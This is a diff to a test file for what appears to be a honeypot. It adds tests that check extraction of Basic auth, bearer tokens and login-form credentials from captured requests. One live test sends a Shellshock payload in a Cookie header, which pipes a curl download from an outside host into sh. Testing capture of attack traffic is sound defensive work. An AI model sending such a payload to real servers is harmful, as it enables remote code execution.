@@ -17,7 +17,7 @@ from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
-from mirage_crawl import capture, eventlog  # noqa: E402
+from mirage_crawl import capture, credentials, eventlog  # noqa: E402
 from mirage_crawl.config import Config  # noqa: E402
 from mirage_crawl.server import build_app, start_sites  # noqa: E402
 
@@ -69,6 +69,32 @@ def test_header_capture() -> None:
           and prefix["body_truncated"] and prefix["content_length"] == 5000)
 
 
+def test_credentials() -> None:
+    print("\ncredential extraction (unit)")
+
+    def ex(headers=(), query=None, body=b"", ctype=None):
+        hdrs = [list(h) for h in headers]
+        if ctype:
+            hdrs.append(["Content-Type", ctype])
+        return [(c.scheme, c.source, c.user, c.password)
+                for c in credentials.extract(hdrs, query, capture.Body(body, False, len(body)) if body else None)]
+
+    check("basic auth decoded", ex([("Authorization", "Basic YWRtaW46aHVudGVyMg==")])
+          == [("basic", "authorization", "admin", "hunter2")])
+    check("basic password may contain colons",
+          ex([("Authorization", "Basic " + base64.b64encode(b"u:a:b").decode())])[0][3] == "a:b")
+    check("malformed basic kept raw", ex([("Authorization", "Basic !!!")]) == [("basic", "authorization", None, "!!!")])
+    check("bearer token kept", ex([("Authorization", "Bearer sk-live-123")]) == [("bearer", "authorization", None, "sk-live-123")])
+    check("api key header kept", ex([("X-Api-Key", "k123")]) == [("api_key", "header:X-Api-Key", None, "k123")])
+    check("wordpress form", ex(body=b"log=admin&pwd=letmein&wp-submit=Log+In",
+                                ctype="application/x-www-form-urlencoded") == [("form", "body", "admin", "letmein")])
+    check("json login", ex(body=b'{"username":"root","password":"toor"}', ctype="application/json")
+          == [("form", "json", "root", "toor")])
+    check("query login", ex(query="user=a&pass=b") == [("form", "query", "a", "b")])
+    check("username without a password is not a credential", ex(body=b"user=a&x=1", ctype="application/x-www-form-urlencoded") == [])
+    check("no auth, no body, nothing", ex([("Host", "x")]) == [])
+
+
 async def raw(target, payload: bytes) -> bytes:
     if isinstance(target, Path):
         reader, writer = await asyncio.open_unix_connection(str(target))
@@ -116,6 +142,8 @@ async def test_live() -> None:
         await raw(port, b"GET /docs/?w=" + WALLET.encode() + b" HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
         await raw(port, b"GET /cgi-bin/status HTTP/1.1\r\nHost: x\r\n"
                         b"Cookie: () { :; }; /bin/bash -c 'curl http://198.51.100.7/s | sh'\r\nConnection: close\r\n\r\n")
+        await raw(port, b"GET /api/tags HTTP/1.1\r\nHost: x\r\nAuthorization: Basic b2xsYW1hOm9sbGFtYQ==\r\n"
+                        b"Connection: close\r\n\r\n")
         await raw(cfg.front_socket, b"GET /x HTTP/1.1\r\nX-Forwarded-For: 5.5.5.5\r\n"
                                     b"X-Mirage-JA4: t13_x_y\r\nHost: x\r\nConnection: close\r\n\r\n")
 
@@ -178,6 +206,18 @@ async def test_live() -> None:
               any("log4shell" in p.exploits for p in profiles.values())
               and any("shellshock" in p.exploits for p in profiles.values()))
 
+        print("\ncredential events (live)")
+        creds = [e for e in events if e["kind"] == eventlog.EVENT_CREDENTIAL]
+        wp = [c for c in creds if c["path"] == "/wp-login.php"]
+        check("login form POST produces a credential event",
+              bool(wp) and (wp[0]["user"], wp[0]["password"]) == ("admin", "letmein"), str(wp))
+        check("credential event joins its request", bool(wp) and wp[0]["rid"] == reqs["/wp-login.php"]["rid"])
+        ollama = [c for c in creds if c["path"] == "/api/tags"]
+        check("basic auth on a hunt route records the persona",
+              bool(ollama) and ollama[0]["persona"] == "ollama" and ollama[0]["user"] == "ollama", str(ollama))
+        check("site routes record the site persona", bool(wp) and wp[0]["persona"] == "site")
+        check("basic auth on any route is captured", any(c["user"] == "admin" and c["password"] == "hunter2" for c in creds))
+
         front = reqs.get("/x")
         check("front's injected headers are not in the logged header list",
               bool(front) and [n for n, _ in front["headers"]] == ["Host", "Connection"], str(front and front["headers"]))
@@ -187,6 +227,7 @@ async def test_live() -> None:
 
 if __name__ == "__main__":
     test_header_capture()
+    test_credentials()
     asyncio.run(test_live())
     print("\nFAILURES: " + ", ".join(failures) if failures else "\nall capture checks passed")
     sys.exit(1 if failures else 0)
